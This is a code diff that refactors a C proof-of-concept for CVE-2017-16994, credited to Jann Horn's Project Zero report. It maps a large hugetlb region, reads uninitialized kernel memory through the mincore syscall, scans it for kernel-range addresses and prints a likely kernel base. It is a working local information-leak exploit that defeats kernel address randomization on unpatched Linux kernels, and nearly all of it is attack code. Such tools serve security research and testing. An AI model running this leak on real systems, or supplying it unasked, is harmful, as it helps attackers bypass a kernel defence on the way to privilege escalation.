@@ -2,33 +2,31 @@
 //
 // mincore heap page disclosure (CVE-2017-16994)
 //
+// The `mincore` syscall copies uninitialized memory
+// from the page allocator to userspace.
+//
+// Patched in kernel v4.15-rc1 on 2017-11-16:
+// https://github.com/torvalds/linux/commit/373c4557d2aa362702c4c2d41288fb1e54990b7c
+//
 // Largely based on original code by Jann Horn:
 // https://bugs.chromium.org/p/project-zero/issues/detail?id=1431
 
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/mman.h>
-#include <sys/utsname.h>
 #include <unistd.h>
 #include "kasld.h"
-
-struct utsname get_kernel_version() {
-  struct utsname u;
-  if (uname(&u) != 0) {
-    printf("[-] uname(): %m\n");
-    exit(1);
-  }
-  return u;
-}
 
 unsigned long get_kernel_addr_mincore() {
   unsigned char buf[getpagesize() / sizeof(unsigned char)];
   unsigned long iterations = 1000000;
   unsigned long addr = 0;
+  unsigned long len = (unsigned long)0x20000000000;
 
   /* A MAP_ANONYMOUS | MAP_HUGETLB mapping */
-  if (mmap((void *)0x66000000, 0x20000000000, PROT_NONE,
+  if (mmap((void *)0x66000000, len, PROT_NONE,
            MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1,
            0) == MAP_FAILED) {
     printf("[-] mmap(): %m\n");
@@ -47,15 +45,15 @@ unsigned long get_kernel_addr_mincore() {
     for (n = 0; n < getpagesize() / sizeof(unsigned char); n++) {
       addr = *(unsigned long *)(&buf[n]);
       /* Kernel address space */
-      if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX) {
-        if (munmap((void *)0x66000000, 0x20000000000))
+      if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
+        if (munmap((void *)0x66000000, len))
           printf("[-] munmap(): %m\n");
         return addr;
       }
     }
   }
 
-  if (munmap((void *)0x66000000, 0x20000000000))
+  if (munmap((void *)0x66000000, len))
     printf("[-] munmap(): %m\n");
 
   printf("[-] kernel base not found in mincore info leak\n");
@@ -63,27 +61,16 @@ unsigned long get_kernel_addr_mincore() {
 }
 
 int main(int argc, char **argv) {
+#if defined(__x86_64__) || defined(__amd64__)
   printf("[.] trying mincore info leak...\n");
-
-  struct utsname u = get_kernel_version();
-
-  if (strstr(u.machine, "x86_64") == NULL) {
-    printf("[-] unsupported: system is not x86_64.\n");
-    exit(1);
-  }
 
   unsigned long addr = get_kernel_addr_mincore();
   if (!addr)
     return 1;
 
   printf("leaked address: %lx\n", addr);
-
-  if ((addr & 0xfffffffffff00000ul) == (addr & 0xffffffffff000000ul)) {
-    printf("kernel base (likely): %lx\n", addr & 0xfffffffffff00000ul);
-  } else {
-    printf("kernel base (possible): %lx\n", addr & 0xfffffffffff00000ul);
-    printf("kernel base (possible): %lx\n", addr & 0xffffffffff000000ul);
-  }
+  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);
+#endif
 
   return 0;
 }
